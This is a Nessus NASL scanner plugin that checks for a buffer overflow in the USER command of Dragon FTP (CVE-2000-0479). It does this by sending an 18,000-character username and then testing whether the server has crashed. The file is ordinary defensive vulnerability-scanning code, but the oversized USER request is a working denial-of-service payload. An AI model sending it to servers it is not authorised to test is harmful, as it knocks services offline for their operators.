#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10450);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2000-0479");
 script_bugtraq_id(1352);
 script_osvdb_id(349);

 script_name(english:"Dragon FTP USER Command Remote Overflow");
 script_summary(english:"Attempts a USER buffer overflows");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote FTP server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote FTP server by issuing a USER
command followed by a very long argument (over 16,000 characters).
This is likely due to a remote buffer overflow vulnerability.  A
remote attacker could exploit this to crash the server, or possibly
execute arbitrary code." );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of your FTP server."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/06/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/06/16");
 script_cvs_date("$Date: 2011/03/11 21:52:32 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2000-2011 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("global_settings.inc");
include("ftp_func.inc");
include("misc_func.inc");

port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

r = ftp_recv_line(socket:soc);
if (! r)
{
  close(soc);
  exit(1, "Cannot read the FTP banner from port "+port+".");
}

  req = string("USER ", crap(18000), "\r\n");
  send(socket:soc, data:req);
  r = ftp_recv_line(socket:soc);
  close(soc);
  sleep(1);

if (service_is_dead(port: port, exit: 0) > 0)
{
  security_hole(port);
  exit(0);
}

if (report_paranoia >= 2)
{
  soc2 = open_sock_tcp(port);
  if (soc2)
  {
    r2 = ftp_recv_line(socket:soc2, retry: 2);
    close(soc2);
  }
  if(!r2) security_hole(port);
}

